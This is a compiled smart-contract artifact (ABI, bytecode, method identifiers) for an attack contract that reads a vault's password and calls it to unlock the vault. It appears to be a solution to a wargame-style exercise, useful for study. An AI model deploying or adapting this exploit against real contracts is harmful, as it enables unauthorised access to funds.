{"abi":[{"type":"constructor","inputs":[{"name":"vaultAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"extractPassword","inputs":[],"outputs":[{"name":"","type":"bytes32","internalType":"bytes32"}],"stateMutability":"nonpayable"},{"type":"event","name":"Password","inputs":[{"name":"password","type":"bytes32","indexed":false,"internalType":"bytes32"}],"anonymous":false}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516101e13803806101e1833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b61015b806100865f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80636ee1896c146100385780639e5faafc14610052575b5f5ffd5b61004061005c565b60405190815260200160405180910390f35b61005a61009a565b005b6001546040518181525f91907fcbcdceea50a751d054c4d54e26c095b2b320d4af6de36a76cc9101ccb065e73c9060200160405180910390a1919050565b5f6100a361005c565b5f546040517fec9b5b3a0000000000000000000000000000000000000000000000000000000081526004810183905291925073ffffffffffffffffffffffffffffffffffffffff169063ec9b5b3a906024015f604051808303815f87803b15801561010c575f5ffd5b505af115801561011e573d5f5f3e3d5ffd5b505050505056fea2646970667358221220e69a47c967c8129e58ccb2083c652d343406de2b2a5816c399197cd338ac410464736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","extractPassword()":"6ee1896c"},"id":0}